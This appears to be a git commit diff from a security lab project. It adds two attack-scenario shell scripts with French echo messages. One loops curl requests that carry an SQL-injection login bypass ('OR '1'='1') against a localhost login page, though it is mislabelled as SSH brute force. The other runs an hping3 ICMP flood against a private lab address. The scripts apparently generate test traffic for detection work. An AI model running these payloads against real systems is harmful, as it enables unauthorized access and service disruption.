863ac47d97c5c1e887525beb661d5f94f5b2a25a
ThoX <antonyhuynh2003@gmail.com>
2025-10-27 23:20:44 -0400

    Scenario 3

--- scripts-attacks/scenario3.sh
+++ scripts-attacks/scenario3.sh
@@ -1,1 +1,10 @@
 #!/bin/bash
+
+echo "Début du scénario 3 : Attaque par Force Brute sur SSH ".
+
+for i in {1..10}
+do
+   curl "http://localhost/login?user=admin&pass=aaaOR%20%271%27%3D%271%27bbb"
+done
+
+echo "Scénario 3 terminé".
--- scripts-attacks/scenario4.sh
+++ scripts-attacks/scenario4.sh
@@ -1,4 +1,9 @@
 #!/bin/bash
 sudo apt install hping3
 
+echo "Début du scénario 4 : Ping Flood ".
+
 timeout 10s sudo hping3 -p 22 --flood -1 172.18.0.5
+
+echo "Scénario 4 terminé".
+
